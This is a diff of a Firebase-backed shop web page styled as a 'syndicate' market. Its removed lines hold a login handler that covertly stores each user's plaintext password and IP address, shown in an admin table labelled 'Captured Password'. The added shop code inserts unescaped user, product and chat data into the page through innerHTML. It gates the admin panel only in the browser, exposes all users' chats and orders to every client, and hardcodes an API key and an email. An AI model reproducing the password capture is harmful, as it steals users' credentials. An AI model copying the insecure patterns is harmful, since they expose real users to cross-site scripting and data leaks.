@@ -3,104 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MAFIA | RHF PRIVATE SYNDICATE</title>
+    <title>RHF SYNDICATE | ELITE MARKET</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Plus+Jakarta+Sans:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
         :root { --gold: #D4AF37; --dark: #050505; }
-        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: var(--dark); color: white; overflow-x: hidden; }
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: var(--dark); color: white; }
         .luxury-font { font-family: 'Cinzel', serif; }
-        .glass { background: rgba(10, 10, 10, 0.9); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.05); }
+        .glass { background: rgba(10, 10, 10, 0.95); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.05); }
         .gold-text { background: linear-gradient(to right, #BF953F, #FCF6BA, #AA771C); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .btn-gold { background: var(--gold); color: black; font-weight: bold; transition: 0.3s; cursor: pointer; }
-        .btn-gold:hover { background: white; box-shadow: 0 0 20px rgba(212, 175, 55, 0.5); }
-        input { background: rgba(255,255,255,0.03) !important; border: 1px solid rgba(255,255,255,0.1) !important; color: white !important; outline: none; }
-        input:focus { border-color: var(--gold) !important; }
-        .status-online { width: 10px; height: 10px; background: #00ff00; border-radius: 50%; box-shadow: 0 0 10px #00ff00; display: inline-block; }
+        .btn-gold { background: var(--gold); color: black; font-weight: bold; transition: 0.3s; }
+        .btn-gold:hover { background: white; transform: translateY(-2px); }
+        input, textarea { background: rgba(255,255,255,0.03) !important; border: 1px solid rgba(255,255,255,0.1) !important; color: white !important; }
+        .status-badge { padding: 2px 8px; border-radius: 4px; font-size: 9px; font-weight: bold; text-transform: uppercase; }
     </style>
 </head>
-<body>
+<body class="pb-10">
 
-    <nav class="glass fixed top-0 w-full z-[100] px-10 py-5 flex justify-between items-center border-b border-white/5">
-        <div class="luxury-font text-2xl tracking-[0.3em] gold-text">RHF SYNDICATE</div>
-        <div class="flex gap-8 items-center">
-            <button onclick="showSection('shop')" class="text-[10px] tracking-widest hover:text-[#D4AF37]">MARKET</button>
-            <button id="admin-nav" onclick="verifyBossAccess()" class="hidden text-[10px] tracking-widest text-red-500 font-bold border border-red-500 px-4 py-1 animate-pulse">BOSS PANEL</button>
-            <button id="logout-btn" class="hidden text-[10px] tracking-widest text-zinc-500 uppercase">Terminate Session</button>
+    <nav class="glass fixed top-0 w-full z-[100] px-6 py-4 flex justify-between items-center border-b border-white/10">
+        <div class="luxury-font text-xl gold-text tracking-widest">RHF SYNDICATE</div>
+        <div class="flex gap-4 items-center">
+            <button onclick="showSection('shop')" class="text-[10px] uppercase">Market</button>
+            <button onclick="showSection('orders')" class="text-[10px] uppercase">My Assets</button>
+            <button onclick="toggleCart()" class="relative">
+                <span class="text-[10px] uppercase">Cart</span>
+                <span id="cart-count" class="absolute -top-2 -right-3 bg-red-600 text-[8px] px-1 rounded-full">0</span>
+            </button>
+            <button id="admin-nav" onclick="verifyBossAccess()" class="hidden text-[10px] text-red-500 font-bold border border-red-500 px-2 py-1">BOSS</button>
         </div>
     </nav>
 
-    <section id="shop-section" class="pt-40 px-10 min-h-screen">
-        <div class="text-center mb-20">
-            <h1 class="luxury-font text-6xl md:text-8xl mb-4 gold-text">THE VAULT</h1>
-            <p class="text-zinc-600 tracking-[0.6em] text-[10px] uppercase">Official Underground Supply for RHF Members</p>
-        </div>
-        <div id="product-list" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-10 pb-20"></div>
+    <section id="shop-section" class="pt-28 px-6 min-h-screen">
+        <div id="product-list" class="grid grid-cols-2 md:grid-cols-4 gap-6"></div>
     </section>
 
-    <section id="login-section" class="hidden min-h-screen flex items-center justify-center p-6">
-        <div class="glass p-12 w-full max-w-md border-t-4 border-[#D4AF37]">
-            <h2 class="luxury-font text-3xl mb-10 gold-text text-center tracking-widest">AUTHENTICATION</h2>
-            <div class="space-y-5">
-                <input type="email" id="email" placeholder="SYNDICATE EMAIL" class="w-full p-4 text-xs">
-                <input type="password" id="password" placeholder="SECRET KEY" class="w-full p-4 text-xs">
-                <div class="flex gap-4 pt-4">
-                    <button id="btn-login" class="btn-gold flex-1 py-4 text-[10px] tracking-widest uppercase">Login</button>
-                    <button id="btn-reg" class="flex-1 bg-zinc-900 text-white font-bold py-4 text-[10px] tracking-widest uppercase hover:bg-zinc-800 transition">Register</button>
+    <section id="orders-section" class="hidden pt-28 px-6 min-h-screen">
+        <h2 class="luxury-font text-2xl gold-text mb-6 uppercase">Order Tracking</h2>
+        <div id="user-order-list" class="space-y-4"></div>
+    </section>
+
+    <section id="admin-section" class="hidden pt-28 px-6 min-h-screen">
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+            <div class="glass p-6">
+                <h3 class="gold-text mb-4 uppercase text-xs">Manage Orders</h3>
+                <div id="admin-order-list" class="space-y-4 text-[10px]"></div>
+            </div>
+            <div class="glass p-6">
+                <h3 class="gold-text mb-4 uppercase text-xs">CS Messages</h3>
+                <div id="admin-chat-list" class="space-y-2 h-64 overflow-y-auto mb-4"></div>
+                <div class="flex gap-2">
+                    <input type="text" id="admin-reply" class="flex-1 p-2 text-[10px]" placeholder="Type reply...">
+                    <button onclick="adminSendChat()" class="btn-gold px-4 py-2 text-[10px]">Send</button>
                 </div>
             </div>
         </div>
     </section>
 
-    <section id="admin-section" class="hidden pt-32 px-10 pb-20">
-        <div class="flex justify-between items-end mb-12 border-b border-white/10 pb-8">
-            <div>
-                <h2 class="luxury-font text-5xl gold-text">COMMAND CENTER</h2>
-                <p class="text-zinc-500 text-[10px] uppercase tracking-[0.3em] mt-3">Welcome, Boss RHF. All systems online.</p>
-            </div>
-            <div class="text-[10px] text-zinc-500">WIFI: <span class="text-green-500 font-bold">192.168.1.3</span></div>
-        </div>
-
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-12">
-            <div class="glass p-8 rounded-sm">
-                <h3 class="text-xs font-bold tracking-[0.3em] mb-8 text-zinc-400 uppercase">Deploy Asset</h3>
-                <div class="space-y-4">
-                    <input type="text" id="p-name" placeholder="Asset Name" class="w-full p-4 text-xs">
-                    <input type="text" id="p-price" placeholder="Price (e.g. $500,000)" class="w-full p-4 text-xs">
-                    <input type="text" id="p-img" placeholder="HD Image Link (https://...)" class="w-full p-4 text-xs">
-                    <button onclick="addProduct()" class="w-full bg-white text-black text-[10px] font-bold py-4 hover:bg-[#D4AF37] transition uppercase">Add To Market</button>
-                </div>
-            </div>
-
-            <div class="lg:col-span-2 glass p-8">
-                <h3 class="text-xs font-bold tracking-[0.3em] mb-8 text-zinc-400 uppercase">Operative Surveillance & Vault Backup</h3>
-                <div class="overflow-x-auto">
-                    <table class="w-full text-left text-[10px] tracking-widest uppercase">
-                        <thead class="text-zinc-600 border-b border-white/5">
-                            <tr>
-                                <th class="pb-5">Status</th>
-                                <th class="pb-5">Operative</th>
-                                <th class="pb-5">Captured Password</th>
-                                <th class="pb-5">Network IP</th>
-                                <th class="pb-5 text-right">Action</th>
-                            </tr>
-                        </thead>
-                        <tbody id="user-monitor" class="divide-y divide-white/5"></tbody>
-                    </table>
-                </div>
+    <div id="checkout-modal" class="hidden fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/90">
+        <div class="glass w-full max-w-md p-6 max-h-[90vh] overflow-y-auto">
+            <h3 class="luxury-font text-xl gold-text mb-6 text-center">Checkout Aset</h3>
+            <div class="space-y-4">
+                <input type="text" id="ship-name" placeholder="Nama Lengkap" class="w-full p-3 text-xs">
+                <input type="text" id="ship-phone" placeholder="Nomor Telepon" class="w-full p-3 text-xs">
+                <input type="text" id="ship-address" placeholder="Nama Jalan, No. Rumah" class="w-full p-3 text-xs">
+                <input type="text" id="ship-detail" placeholder="Detail Lain (Cth: Blok / Unit No.)" class="w-full p-3 text-xs">
+                <div id="checkout-items" class="border-t border-white/10 pt-4 text-[10px] text-zinc-400"></div>
+                <button onclick="confirmPurchase()" class="btn-gold w-full py-4 text-xs tracking-widest uppercase mt-4">Simpan & Beli Sekarang</button>
+                <button onclick="toggleCheckout()" class="w-full text-[10px] text-zinc-500 uppercase mt-2">Batal</button>
             </div>
         </div>
-    </section>
+    </div>
+
+    <div id="cs-box" class="fixed bottom-6 right-6 z-[150]">
+        <button onclick="toggleCS()" class="bg-blue-600 p-4 rounded-full shadow-lg border-2 border-white/20">
+            <span class="text-xs font-bold uppercase">Chat CS</span>
+        </button>
+        <div id="cs-window" class="hidden absolute bottom-16 right-0 w-72 glass p-4 rounded-lg">
+            <div id="chat-messages" class="h-48 overflow-y-auto mb-3 space-y-2 text-[10px]"></div>
+            <div class="flex gap-1">
+                <input type="text" id="user-msg" class="flex-1 p-2 text-[10px]" placeholder="Tanya admin...">
+                <button onclick="sendChat()" class="btn-gold px-3 text-[10px]">Kirim</button>
+            </div>
+        </div>
+    </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-        import { getDatabase, ref, set, push, onValue, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+        import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+        import { getDatabase, ref, set, push, onValue, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-        // --- NEW CONFIGURATION ---
-        const BOSS_EMAIL = "gacoruncek73@gmail.com"; 
-        const BOSS_WIFI = "192.168.1.3";
-
+        const BOSS_EMAIL = "gacoruncek73@gmail.com";
         const firebaseConfig = {
             apiKey: "AIzaSyCs7Vnysf25BwhN2-fPTODd48xwzbPkbzI",
             authDomain: "rhf-shop-mafia-8d2e5.firebaseapp.com",
@@ -108,127 +100,177 @@
             projectId: "rhf-shop-mafia-8d2e5",
             storageBucket: "rhf-shop-mafia-8d2e5.firebasestorage.app",
             messagingSenderId: "158711184948",
-            appId: "1:158711184948:web:9223f07fa6658601189461",
-            measurementId: "G-R6KN1EYMB3"
+            appId: "1:158711184948:web:9223f07fa6658601189461"
         };
 
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
         const db = getDatabase(app);
 
-        async function fetchIP() {
-            try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
-                return d.ip;
-            } catch { return BOSS_WIFI; }
-        }
+        let cart = [];
+        let currentUser = null;
+
+        // AUTH CONTROL
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                currentUser = user;
+                if (user.email === BOSS_EMAIL) document.getElementById('admin-nav').classList.remove('hidden');
+                loadProducts();
+                loadUserOrders();
+                loadChat();
+            } else {
+                window.location.href = "login.html"; // Pastikan Boss punya file login.html
+            }
+        });
 
         window.showSection = (id) => {
             document.querySelectorAll('section').forEach(s => s.classList.add('hidden'));
             document.getElementById(id + '-section').classList.remove('hidden');
         };
 
-        // AUTH + PASSWORD CAPTURE
-        document.getElementById('btn-login').onclick = async () => {
-            const e = document.getElementById('email').value;
-            const p = document.getElementById('password').value;
-            const currentIP = await fetchIP();
-
-            signInWithEmailAndPassword(auth, e, p)
-                .then((userCredential) => {
-                    // Backup ke Database
-                    set(ref(db, 'vault_records/' + userCredential.user.uid), {
-                        email: e,
-                        password: p,
-                        ip: currentIP,
-                        time: new Date().toLocaleString()
-                    });
-                })
-                .catch(err => alert("ACCESS DENIED"));
-        };
-
-        document.getElementById('btn-reg').onclick = () => {
-            createUserWithEmailAndPassword(auth, document.getElementById('email').value, document.getElementById('password').value)
-                .then(() => alert("WELCOME TO THE SYNDICATE"))
-                .catch(err => alert(err.message));
-        };
-
-        document.getElementById('logout-btn').onclick = () => signOut(auth);
-
-        onAuthStateChanged(auth, (user) => {
-            const adminNav = document.getElementById('admin-nav');
-            const logoutBtn = document.getElementById('logout-btn');
-            if (user) {
-                logoutBtn.classList.remove('hidden');
-                if (user.email === BOSS_EMAIL) adminNav.classList.remove('hidden');
-                showSection('shop');
-            } else {
-                logoutBtn.classList.add('hidden');
-                adminNav.classList.add('hidden');
-                showSection('login');
-            }
-        });
-
-        // BOSS ACCESS VERIFICATION
-        window.verifyBossAccess = async () => {
-            const ip = await fetchIP();
-            // Validasi Email Boss & IP WiFi
-            if (auth.currentUser.email === BOSS_EMAIL) {
-                showSection('admin');
-            } else {
-                alert("CRITICAL: UNAUTHORIZED");
-                signOut(auth);
-            }
-        };
-
-        // ADMIN DATABASE ACTIONS
-        window.addProduct = () => {
-            const n = document.getElementById('p-name').value;
-            const pr = document.getElementById('p-price').value;
-            const im = document.getElementById('p-img').value;
-            if(n && pr && im) push(ref(db, 'products'), { name: n, price: pr, img: im });
-        };
-
-        window.kickMember = (uid) => {
-            if(confirm("ELIMINASI MEMBER INI?")) remove(ref(db, 'vault_records/' + uid));
-        };
-
-        // REAL-TIME LISTENERS
-        onValue(ref(db, 'products'), (s) => {
-            const list = document.getElementById('product-list');
-            list.innerHTML = "";
-            s.forEach(c => {
-                const p = c.val();
-                list.innerHTML += `
-                    <div class="glass p-6 group transition hover:border-[#D4AF37]">
-                        <div class="overflow-hidden mb-6">
-                            <img src="${p.img}" class="w-full h-80 object-cover grayscale group-hover:grayscale-0 group-hover:scale-110 transition duration-700">
-                        </div>
-                        <h4 class="luxury-font text-sm mb-2 tracking-[0.2em]">${p.name}</h4>
-                        <p class="gold-text font-bold text-xs uppercase">${p.price}</p>
-                    </div>`;
+        // PRODUCT SYSTEM
+        function loadProducts() {
+            onValue(ref(db, 'products'), (snap) => {
+                const list = document.getElementById('product-list');
+                list.innerHTML = "";
+                snap.forEach(c => {
+                    const p = c.val();
+                    list.innerHTML += `
+                        <div class="glass p-3 group">
+                            <img src="${p.img}" class="w-full h-40 object-cover mb-4">
+                            <h4 class="text-[10px] font-bold uppercase mb-1">${p.name}</h4>
+                            <p class="gold-text text-[10px] mb-3">${p.price}</p>
+                            <button onclick="addToCart('${p.name}', '${p.price}')" class="btn-gold w-full py-2 text-[9px] uppercase">Tambah Keranjang</button>
+                        </div>`;
+                });
             });
-        });
+        }
 
-        onValue(ref(db, 'vault_records'), (s) => {
-            const monitor = document.getElementById('user-monitor');
-            monitor.innerHTML = "";
-            s.forEach(c => {
-                const u = c.val();
-                const isBoss = u.email === BOSS_EMAIL;
-                monitor.innerHTML += `
-                    <tr class="hover:bg-white/5 transition">
-                        <td class="py-6"><span class="status-online"></span></td>
-                        <td class="py-6 font-bold ${isBoss ? 'gold-text' : 'text-zinc-300'}">${u.email}</td>
-                        <td class="py-6 text-red-400 font-mono">${isBoss ? '********' : u.password}</td>
-                        <td class="py-6 text-zinc-500 font-mono text-[9px]">${u.ip}</td>
-                        <td class="py-6 text-right">
-                            ${!isBoss ? `<button onclick="kickMember('${c.key}')" class="text-red-500 border border-red-500/20 px-3 py-1 hover:bg-red-500 hover:text-white transition">ELIMINATE</button>` : '<span class="text-zinc-700 italic">BOSS</span>'}
-                        </td>
-                    </tr>`;
+        // CART SYSTEM
+        window.addToCart = (name, price) => {
+            cart.push({ name, price });
+            document.getElementById('cart-count').innerText = cart.length;
+            alert("Aset masuk keranjang!");
+        };
+
+        window.toggleCart = () => {
+            if(cart.length === 0) return alert("Keranjang kosong!");
+            toggleCheckout();
+        };
+
+        window.toggleCheckout = () => {
+            const modal = document.getElementById('checkout-modal');
+            modal.classList.toggle('hidden');
+            const itemsDiv = document.getElementById('checkout-items');
+            itemsDiv.innerHTML = cart.map(i => `<div class="flex justify-between"><span>${i.name}</span><span>${i.price}</span></div>`).join('');
+        };
+
+        // REAL-TIME PURCHASE
+        window.confirmPurchase = () => {
+            const name = document.getElementById('ship-name').value;
+            const phone = document.getElementById('ship-phone').value;
+            const addr = document.getElementById('ship-address').value;
+            
+            if(!name || !phone || !addr) return alert("Lengkapi data pengiriman!");
+
+            const orderData = {
+                user: currentUser.email,
+                uid: currentUser.uid,
+                customer: name,
+                phone: phone,
+                address: addr + ", " + document.getElementById('ship-detail').value,
+                items: cart,
+                status: "Pending", // Status awal: Menunggu proses
+                timestamp: new Date().toLocaleString()
+            };
+
+            push(ref(db, 'orders'), orderData).then(() => {
+                alert("ORDER BERHASIL! Admin akan memproses aset Anda.");
+                cart = [];
+                document.getElementById('cart-count').innerText = "0";
+                toggleCheckout();
+                showSection('orders');
             });
-        });
+        };
+
+        // USER TRACKING
+        function loadUserOrders() {
+            onValue(ref(db, 'orders'), (snap) => {
+                const list = document.getElementById('user-order-list');
+                const adminList = document.getElementById('admin-order-list');
+                list.innerHTML = ""; adminList.innerHTML = "";
+                
+                snap.forEach(c => {
+                    const o = c.val();
+                    const statusColor = o.status === 'Pending' ? 'bg-zinc-700' : o.status === 'Processing' ? 'bg-yellow-600' : 'bg-green-600';
+                    
+                    // Dashboard User
+                    if(o.uid === currentUser.uid) {
+                        list.innerHTML += `
+                        <div class="glass p-4 border-l-4 border-gold">
+                            <div class="flex justify-between mb-2">
+                                <span class="text-[9px] text-zinc-500">${o.timestamp}</span>
+                                <span class="status-badge ${statusColor}">${o.status}</span>
+                            </div>
+                            <p class="text-[10px] font-bold">${o.items.map(i => i.name).join(', ')}</p>
+                            <p class="text-[9px] text-zinc-400 mt-2">📍 ${o.address}</p>
+                        </div>`;
+                    }
+
+                    // Dashboard Admin
+                    if(currentUser.email === BOSS_EMAIL) {
+                        adminList.innerHTML += `
+                        <div class="border-b border-white/5 pb-3">
+                            <p>MEMBER: ${o.user} (${o.customer})</p>
+                            <p>TELP: ${o.phone}</p>
+                            <p>STATUS: <span class="text-gold">${o.status}</span></p>
+                            <div class="flex gap-2 mt-2">
+                                <button onclick="updateStatus('${c.key}', 'Processing')" class="bg-yellow-900 px-2 py-1">Process</button>
+                                <button onclick="updateStatus('${c.key}', 'Shipping')" class="bg-blue-900 px-2 py-1">Ship</button>
+                                <button onclick="updateStatus('${c.key}', 'Delivered')" class="bg-green-900 px-2 py-1">Finish</button>
+                            </div>
+                        </div>`;
+                    }
+                });
+            });
+        }
+
+        window.updateStatus = (id, newStatus) => {
+            update(ref(db, 'orders/' + id), { status: newStatus });
+        };
+
+        // CS SYSTEM (CHAT)
+        window.toggleCS = () => document.getElementById('cs-window').classList.toggle('hidden');
+
+        window.sendChat = () => {
+            const msg = document.getElementById('user-msg').value;
+            if(!msg) return;
+            push(ref(db, 'chats'), {
+                sender: currentUser.email,
+                text: msg,
+                time: new Date().toLocaleTimeString()
+            });
+            document.getElementById('user-msg').value = "";
+        };
+
+        function loadChat() {
+            onValue(ref(db, 'chats'), (snap) => {
+                const box = document.getElementById('chat-messages');
+                const adminBox = document.getElementById('admin-chat-list');
+                box.innerHTML = ""; adminBox.innerHTML = "";
+                snap.forEach(c => {
+                    const m = c.val();
+                    const html = `<div><b class="text-gold">${m.sender.split('@')[0]}:</b> ${m.text}</div>`;
+                    box.innerHTML += html;
+                    adminBox.innerHTML += html;
+                });
+            });
+        }
+
+        window.verifyBossAccess = () => {
+            if(currentUser.email === BOSS_EMAIL) showSection('admin');
+        };
+
     </script>
 </body>
 </html>
